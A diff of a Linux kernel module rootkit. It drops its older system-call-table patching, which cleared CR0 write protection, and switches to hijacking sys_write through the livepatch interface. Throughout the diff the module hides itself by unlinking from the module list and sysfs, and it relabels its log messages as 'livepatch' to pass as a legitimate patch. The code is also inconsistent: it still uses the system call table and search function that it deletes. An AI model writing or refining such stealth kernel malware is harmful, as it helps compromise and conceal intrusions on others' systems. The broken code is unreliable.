@@ -26,40 +26,32 @@
 #include <linux/syscalls.h>
 #include <linux/string.h>
 #include <linux/slab.h>
+#include <linux/livepatch.h>
 
-#if defined(__i386__)
-#define START_CHECK 0xc0000000
-#define END_CHECK 0xd0000000
-typedef unsigned int psize;
-#else
-#define START_CHECK 0xffffffff81000000
-#define END_CHECK 0xffffffffa2000000
-typedef unsigned long psize;
-#endif
+static struct klp_func funcs[] = {
+	{
+		.old_name = "sys_write",
+		.new_func = hijack_write,
+	}, { }
+};
 
-psize *sys_call_table;
-asmlinkage ssize_t (*original_write)(int fd, const char __user *buff, ssize_t count);
+static struct klp_object objs[] = {
+	{
+		/* name being NULL means vmlinux */
+		.funcs = funcs,
+	}, { }
+};
 
-/*
- * Bruteforde find of sys_table in kernel memory
- */
-psize **find_sys_tab(void) {
-  psize **sctable;
-  psize i = START_CHECK;
-  while (i < END_CHECK) {
-    sctable = (psize **) i;
-    if (sctable[__NR_close] == (psize *) sys_close) {
-      return &sctable[0];
-    }
-    i += sizeof(void *);
-  }
-  return NULL;
-}
+static struct klp_patch patch = {
+	.mod = THIS_MODULE,
+	.objs = objs,
+};
 
 /*
  * Hijacked sys_call
  */
 asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
+  printk("livepatch: hijack_write executed\n");
   int to_return; 
   char proc_protect = ".evil"; 
   char *kbuff = (char *) kmalloc(256,GFP_KERNEL); 
@@ -74,41 +66,38 @@ asmlinkage ssize_t hijack_write(int fd, const char __user *buff, size_t count) {
 }
 
 int hijack_init(void) {
-  printk("hijack: LKM loaded\n");
+	int ret;
+  printk("livepatch: LKM loaded\n");
 
   list_del_init(&__this_module.list);
   kobject_del(&THIS_MODULE->mkobj.kobj);
-  printk("hijack: LKM hidden\n");
+  printk("livepatch: LKM hidden\n");
 
   if (sys_call_table = (psize *) find_sys_tab()) {
-    printk("hijack: sys_call_table found at %p\n",sys_call_table);
+    printk("livepatch: sys_call_table found at %p\n",sys_call_table);
   } else {
-    printk("hijack: sys_call_table not found\n");
+    printk("livepatch: sys_call_table not found\n");
   }
 
-  write_cr0(read_cr0() & (~ 0x10000)); 
-  printk("hijack: cr0 write protection removed");
-
-  original_write = (void *) xchg(&sys_call_table[__NR_write],hijack_write);
-  printk("hijack: exchanged original sys_call with hijacked");
-
-  write_cr0(read_cr0() | 0x10000); 
-  printk("hijack: cr0 write protection activated");
+	ret = klp_register_patch(&patch);
+	if (ret)
+		return ret;
+	ret = klp_enable_patch(&patch);
+	if (ret) {
+		WARN_ON(klp_unregister_patch(&patch));
+		return ret;
+	}
+  printk("livepatch: exchanged original sys_call with hijacked");
 
   return 0;
 }
 
 void hijack_exit(void) {
-  write_cr0(read_cr0() & (~ 0x10000)); 
-  printk("hijack: cr0 write protection removed");
+	WARN_ON(klp_disable_patch(&patch));
+	WARN_ON(klp_unregister_patch(&patch));
+  printk("livepatch: exchanged hijacked sys_call with original");
 
-  xchg(&sys_call_table[__NR_write],original_write);
-  printk("hijack: exchanged hijacked sys_call with original");
-
-  write_cr0(read_cr0() | 0x10000);
-  printk("hijack: cr0 write protection activated");
-
-  printk("hijack: LKM removed\n");
+  printk("livepatch: LKM removed\n");
 }
 
 MODULE_LICENSE("EUPL");
